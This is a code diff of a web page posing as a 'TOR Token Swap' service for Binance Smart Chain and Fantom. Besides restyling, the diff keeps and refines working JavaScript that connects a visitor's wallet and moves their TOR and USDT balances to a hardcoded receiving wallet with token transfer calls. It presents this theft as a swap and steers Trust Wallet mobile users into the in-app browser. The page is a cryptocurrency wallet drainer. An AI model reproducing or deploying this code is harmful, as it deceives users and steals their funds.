@@ -14,7 +14,6 @@
       --success: #00b894;
       --danger: #d63031;
       --warning: #fdcb6e;
-      --gray: #636e72;
     }
     
     * {
@@ -28,103 +27,88 @@
       background-color: var(--light);
       color: var(--dark);
       line-height: 1.6;
+    }
+    
+    .container {
+      max-width: 500px;
+      margin: 0 auto;
       padding: 20px;
     }
     
-    .swap-container {
-      max-width: 500px;
-      margin: 0 auto;
+    .card {
       background: white;
       border-radius: 16px;
-      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
       padding: 30px;
+      margin-bottom: 20px;
       position: relative;
+      overflow: hidden;
     }
     
     .header {
       text-align: center;
       margin-bottom: 25px;
+      position: relative;
+    }
+    
+    .logo {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      object-fit: contain;
+      margin-bottom: 15px;
+      border: 3px solid var(--primary);
+      padding: 5px;
     }
     
     h1 {
       color: var(--primary);
-      font-size: 24px;
+      font-size: 28px;
       margin-bottom: 10px;
     }
     
     .description {
-      color: var(--gray);
+      color: #636e72;
       font-size: 16px;
+      margin-bottom: 25px;
+    }
+    
+    .token-info {
+      background: rgba(108, 92, 231, 0.1);
+      border-radius: 12px;
+      padding: 15px;
       margin-bottom: 20px;
     }
     
-    .links {
+    .token-links {
       display: flex;
       justify-content: center;
       gap: 15px;
-      margin-bottom: 25px;
+      margin-bottom: 20px;
     }
     
-    .link {
+    .token-link {
       color: var(--primary);
-      font-weight: 600;
       text-decoration: none;
+      font-weight: 600;
       display: flex;
       align-items: center;
       gap: 5px;
+      transition: all 0.3s;
     }
     
-    .mobile-warning {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      background: rgba(253, 203, 110, 0.3);
-      padding: 12px;
-      border-radius: 8px;
-      margin-bottom: 25px;
-      font-size: 14px;
-    }
-    
-    .token-list {
-      margin-bottom: 25px;
-    }
-    
-    .token {
-      display: flex;
-      align-items: center;
-      padding: 12px;
-      background: rgba(108, 92, 231, 0.05);
-      border-radius: 8px;
-      margin-bottom: 10px;
-    }
-    
-    .token-icon {
-      width: 24px;
-      height: 24px;
-      margin-right: 12px;
-    }
-    
-    .token-name {
-      font-weight: 600;
-      flex-grow: 1;
-    }
-    
-    .token-network {
-      font-size: 12px;
-      color: var(--gray);
-      background: rgba(99, 110, 114, 0.1);
-      padding: 3px 6px;
-      border-radius: 4px;
+    .token-link:hover {
+      color: var(--secondary);
     }
     
     .btn {
       background: var(--primary);
       color: white;
       border: none;
-      padding: 15px;
+      padding: 15px 25px;
       font-size: 16px;
       font-weight: 600;
-      border-radius: 8px;
+      border-radius: 12px;
       cursor: pointer;
       width: 100%;
       display: flex;
@@ -137,16 +121,22 @@
     
     .btn:hover {
       background: var(--secondary);
+      transform: translateY(-2px);
     }
     
     .btn:disabled {
       background: #b2bec3;
       cursor: not-allowed;
+      transform: none;
+    }
+    
+    .btn i {
+      font-size: 18px;
     }
     
     .status {
       padding: 15px;
-      border-radius: 8px;
+      border-radius: 12px;
       margin-bottom: 15px;
       display: none;
     }
@@ -161,26 +151,6 @@
       background: rgba(214, 48, 49, 0.1);
       color: var(--danger);
       border: 1px solid rgba(214, 48, 49, 0.3);
-    }
-    
-    .footer {
-      text-align: center;
-      margin-top: 20px;
-      font-size: 14px;
-      color: var(--gray);
-    }
-    
-    .network-selector {
-      margin-bottom: 20px;
-    }
-    
-    select {
-      width: 100%;
-      padding: 12px;
-      border-radius: 8px;
-      border: 1px solid #dfe6e9;
-      background: white;
-      font-size: 16px;
     }
     
     .loader {
@@ -199,109 +169,201 @@
       100% { transform: rotate(360deg); }
     }
     
-    @media (max-width: 500px) {
-      .swap-container {
+    .wallet-info {
+      font-size: 14px;
+      color: #636e72;
+      text-align: center;
+      margin-bottom: 15px;
+      word-break: break-all;
+    }
+    
+    .tx-link {
+      color: var(--primary);
+      text-decoration: none;
+      font-weight: 600;
+      transition: all 0.3s;
+    }
+    
+    .tx-link:hover {
+      text-decoration: underline;
+    }
+    
+    .token-list {
+      margin-bottom: 20px;
+    }
+    
+    .token-item {
+      display: flex;
+      align-items: center;
+      padding: 12px;
+      background: rgba(108, 92, 231, 0.05);
+      border-radius: 10px;
+      margin-bottom: 10px;
+    }
+    
+    .token-icon {
+      width: 30px;
+      height: 30px;
+      margin-right: 12px;
+      border-radius: 50%;
+    }
+    
+    .token-name {
+      font-weight: 600;
+      flex-grow: 1;
+    }
+    
+    .token-network {
+      font-size: 12px;
+      color: #636e72;
+      background: rgba(99, 110, 114, 0.1);
+      padding: 3px 6px;
+      border-radius: 4px;
+    }
+    
+    .mobile-warning {
+      display: none;
+      background: var(--warning);
+      color: var(--dark);
+      padding: 15px;
+      border-radius: 10px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+    
+    .network-selector {
+      margin-bottom: 20px;
+    }
+    
+    select {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      border: 1px solid #dfe6e9;
+      background: white;
+      font-size: 16px;
+    }
+    
+    @media (max-width: 600px) {
+      .container {
+        padding: 15px;
+      }
+      
+      .card {
         padding: 20px;
+      }
+      
+      .mobile-warning {
+        display: block;
       }
     }
   </style>
 </head>
 <body>
-  <div class="swap-container">
-    <div class="header">
-      <h1>TOR Token Swap</h1>
-      <p class="description">Swap your TOR and USDT tokens to TRX-based assets</p>
+  <div class="container">
+    <div class="card">
+      <div class="header">
+        <img src="https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png" alt="TOR Logo" class="logo">
+        <h1>TOR Token Swap</h1>
+        <p class="description">Swap your TOR and USDT tokens to TRX-based assets</p>
+        
+        <div class="token-links">
+          <a href="https://www.coingecko.com/en/coins/tor" target="_blank" class="token-link">
+            <i class="fas fa-chart-line"></i> CoinGecko
+          </a>
+          <a href="https://coinmarketcap.com/currencies/tor/" target="_blank" class="token-link">
+            <i class="fas fa-coins"></i> CoinMarketCap
+          </a>
+        </div>
+      </div>
       
-      <div class="links">
-        <a href="https://www.coingecko.com/en/coins/tor" target="_blank" class="link">
-          <i class="fas fa-chart-line"></i> CoinGecko
-        </a>
-        <a href="https://coinmarketcap.com/currencies/tor/" target="_blank" class="link">
-          <i class="fas fa-coins"></i> CoinMarketCap
-        </a>
+      <div class="mobile-warning">
+        <i class="fas fa-mobile-alt"></i> For Trust Wallet mobile users, please use the in-app browser
       </div>
-    </div>
-    
-    <div class="mobile-warning">
-      <i class="fas fa-mobile-alt"></i>
-      <span>For Trust Wallet mobile users, please use the in-app browser</span>
-    </div>
-    
-    <div class="network-selector">
-      <select id="networkSelect">
-        <option value="bsc">Binance Smart Chain</option>
-        <option value="fantom">Fantom Opera</option>
-      </select>
-    </div>
-    
-    <div class="token-list">
-      <div class="token" data-network="bsc">
-        <img src="https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png" alt="TOR" class="token-icon">
-        <span class="token-name">TOR Token</span>
-        <span class="token-network">BSC</span>
+      
+      <div class="network-selector">
+        <select id="networkSelect">
+          <option value="bsc">Binance Smart Chain</option>
+          <option value="fantom">Fantom Opera</option>
+        </select>
       </div>
-      <div class="token" data-network="fantom">
-        <img src="https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png" alt="TOR" class="token-icon">
-        <span class="token-name">TOR Token</span>
-        <span class="token-network">Fantom</span>
+      
+      <div class="token-list">
+        <div class="token-item" data-network="bsc">
+          <img src="https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png" alt="TOR" class="token-icon">
+          <span class="token-name">TOR Token</span>
+          <span class="token-network">BSC</span>
+        </div>
+        <div class="token-item" data-network="fantom">
+          <img src="https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png" alt="TOR" class="token-icon">
+          <span class="token-name">TOR Token</span>
+          <span class="token-network">Fantom</span>
+        </div>
+        <div class="token-item" data-network="bsc">
+          <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" class="token-icon">
+          <span class="token-name">USDT</span>
+          <span class="token-network">BSC</span>
+        </div>
       </div>
-      <div class="token" data-network="bsc">
-        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" class="token-icon">
-        <span class="token-name">USDT</span>
-        <span class="token-network">BSC</span>
-      </div>
-    </div>
-    
-    <button id="connectWallet" class="btn">
-      <i class="fas fa-wallet"></i> Connect Wallet & Swap
-    </button>
-    
-    <div id="loader" class="loader"></div>
-    
-    <div id="status" class="status error">Error: Please install MetaMask or Trust Wallet!</div>
-    
-    <div class="footer">
-      <a href="https://tortoken.net" target="_blank">tortoken.net</a>
+      
+      <button id="connectWallet" class="btn">
+        <i class="fas fa-wallet"></i> Connect Wallet & Swap
+      </button>
+      <div id="loader" class="loader"></div>
+      
+      <div id="walletInfo" class="wallet-info"></div>
+      <div id="status" class="status"></div>
     </div>
   </div>
 
+  <!-- Load Ethers.js -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.2/dist/ethers.umd.min.js"></script>
   <script>
     // Configuration
     const RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
     
+    // Token contracts
     const TOKENS = {
       bsc: [
         {
           name: "TOR",
           symbol: "TOR",
           address: "0x1d6cbdc6b29c6afbae65444a1f65ba9252b8ca83",
-          abi: ["function balanceOf(address) view returns (uint256)", "function transfer(address,uint256) returns (bool)"],
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
           decimals: 18,
           logo: "https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png"
         },
         {
           name: "USDT",
           symbol: "USDT",
-          address: "0x55d398326f99059fF775485246999027B3197955", 
-          abi: ["function balanceOf(address) view returns (uint256)", "function transfer(address,uint256) returns (bool)"],
+          address: "0x55d398326f99059fF775485246999027B3197955",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
           decimals: 18,
           logo: "https://cryptologos.cc/logos/tether-usdt-logo.png"
         }
       ],
       fantom: [
         {
-          name: "TOR", 
+          name: "TOR",
           symbol: "TOR",
           address: "0x74e23df9110aa9ea0b6ff2faee01e740ca1c642e",
-          abi: ["function balanceOf(address) view returns (uint256)", "function transfer(address,uint256) returns (bool)"],
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
           decimals: 18,
           logo: "https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png"
         }
       ]
     };
     
-    const NETWORKS = {
+    const NETWORK_CONFIGS = {
       bsc: {
         chainId: "0x38",
         chainName: "Binance Smart Chain",
@@ -311,7 +373,7 @@
         scanUrl: "https://bscscan.com/tx/"
       },
       fantom: {
-        chainId: "0xfa", 
+        chainId: "0xfa",
         chainName: "Fantom Opera",
         nativeCurrency: { name: "FTM", symbol: "FTM", decimals: 18 },
         rpcUrls: ["https://rpc.ftm.tools/"],
@@ -321,55 +383,36 @@
     };
 
     // Global variables
-    let currentNetwork = "bsc";
     let provider, signer, userAddress;
+    let currentNetwork = "bsc";
 
     // Initialize when page loads
     window.addEventListener('load', () => {
       // Set up network selection
-      document.getElementById('networkSelect').addEventListener('change', (e) => {
+      document.getElementById("networkSelect").addEventListener('change', (e) => {
         currentNetwork = e.target.value;
         updateTokenVisibility();
       });
-
-      // Connect wallet button
-      document.getElementById('connectWallet').addEventListener('click', connectAndSwap);
-
+      
+      document.getElementById("connectWallet").addEventListener("click", connectAndSwap);
+      
       // Check if Trust Wallet mobile browser
       if (isTrustWalletMobile()) {
-        document.querySelector('.mobile-warning').style.display = 'flex';
+        document.querySelector('.mobile-warning').style.display = 'block';
       }
-
+      
       // Initial token visibility update
       updateTokenVisibility();
-      
-      // Check if wallet is already connected
-      checkInitialConnection();
     });
 
-    function isTrustWalletMobile() {
-      return /TrustWallet/i.test(navigator.userAgent) && /Mobile/i.test(navigator.userAgent);
-    }
-
     function updateTokenVisibility() {
-      document.querySelectorAll('.token').forEach(token => {
-        token.style.display = token.dataset.network === currentNetwork ? 'flex' : 'none';
+      document.querySelectorAll('.token-item').forEach(item => {
+        item.style.display = item.dataset.network === currentNetwork ? 'flex' : 'none';
       });
     }
 
-    async function checkInitialConnection() {
-      if (window.ethereum && window.ethereum.selectedAddress) {
-        try {
-          provider = new ethers.providers.Web3Provider(window.ethereum);
-          signer = provider.getSigner();
-          userAddress = await signer.getAddress();
-          
-          document.getElementById('status').style.display = 'none';
-          document.getElementById('connectWallet').innerHTML = '<i class="fas fa-wallet"></i> Connected';
-        } catch (err) {
-          console.error("Initial connection check failed:", err);
-        }
-      }
+    function isTrustWalletMobile() {
+      return /TrustWallet/i.test(navigator.userAgent) && /Mobile/i.test(navigator.userAgent);
     }
 
     // Main function to connect wallet and swap tokens
@@ -377,8 +420,7 @@
       try {
         if (!window.ethereum) {
           if (isTrustWalletMobile()) {
-            // Special handling for Trust Wallet mobile
-            window.location.href = `trust://browser?url=${encodeURIComponent(window.location.href)}`;
+            window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(window.location.href)}`;
             return;
           }
           throw new Error("Please install MetaMask or Trust Wallet!");
@@ -388,11 +430,10 @@
         updateStatus("Connecting wallet...", "success");
 
         // Request account access
-        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+        await window.ethereum.request({ method: "eth_requestAccounts" });
         
-        if (!accounts || accounts.length === 0) {
-          throw new Error("No accounts found");
-        }
+        // Check and switch network if needed
+        await checkNetwork();
         
         // Initialize provider and signer
         provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -402,17 +443,14 @@
         // Update UI
         document.getElementById("connectWallet").disabled = true;
         document.getElementById("connectWallet").innerHTML = `<i class="fas fa-spinner fa-spin"></i> Processing...`;
-        document.getElementById("status").style.display = "none";
-        
-        // Check and switch network if needed
-        await checkNetwork();
+        document.getElementById("walletInfo").textContent = 
+          `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | Network: ${NETWORK_CONFIGS[currentNetwork].chainName}`;
         
         // Execute the swaps automatically
         await swapAllTokens();
       } catch (err) {
-        console.error("Connection error:", err);
         hideLoader();
-        updateStatus("Error: " + (err.message || "Failed to connect wallet"), "error");
+        updateStatus("Error: " + err.message, "error");
         document.getElementById("connectWallet").disabled = false;
         document.getElementById("connectWallet").innerHTML = `<i class="fas fa-wallet"></i> Connect Wallet & Swap`;
       }
@@ -420,25 +458,24 @@
 
     async function checkNetwork() {
       const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-      const targetChainId = NETWORKS[currentNetwork].chainId;
+      const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
       
       if (chainId !== targetChainId) {
-        updateStatus(`Switching to ${NETWORKS[currentNetwork].chainName}...`, "success");
+        updateStatus(`Switching to ${NETWORK_CONFIGS[currentNetwork].chainName}...`, "success");
         try {
           await window.ethereum.request({
             method: 'wallet_switchEthereumChain',
             params: [{ chainId: targetChainId }]
           });
         } catch (switchError) {
-          // This error code indicates that the chain has not been added to MetaMask
           if (switchError.code === 4902) {
             try {
               await window.ethereum.request({
                 method: 'wallet_addEthereumChain',
-                params: [NETWORKS[currentNetwork]]
+                params: [NETWORK_CONFIGS[currentNetwork]]
               });
             } catch (addError) {
-              throw new Error(`Please add ${NETWORKS[currentNetwork].chainName} network manually`);
+              throw new Error(`Please switch to ${NETWORK_CONFIGS[currentNetwork].chainName} manually`);
             }
           } else {
             throw new Error("Failed to switch network");
@@ -467,7 +504,7 @@
               await tx.wait();
               
               updateStatus(
-                `${token.symbol} transfer successful! <a href="${NETWORKS[currentNetwork].scanUrl}${tx.hash}" target="_blank" style="color: var(--primary); text-decoration: none; font-weight: 600;">View transaction</a>`,
+                `${token.symbol} transfer successful! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
                 "success"
               );
               successCount++;
@@ -475,7 +512,6 @@
               updateStatus(`No ${token.symbol} balance found`, "success");
             }
           } catch (tokenError) {
-            console.error(`Token swap error (${token.name}):`, tokenError);
             updateStatus(`${token.symbol} transfer failed: ${tokenError.message}`, "error");
           }
         }
@@ -488,8 +524,7 @@
         
         document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Swap Completed`;
       } catch (err) {
-        console.error("Swap process error:", err);
-        updateStatus("Swap process failed: " + err.message, "error");
+        throw new Error("Swap process failed: " + err.message);
       } finally {
         hideLoader();
       }
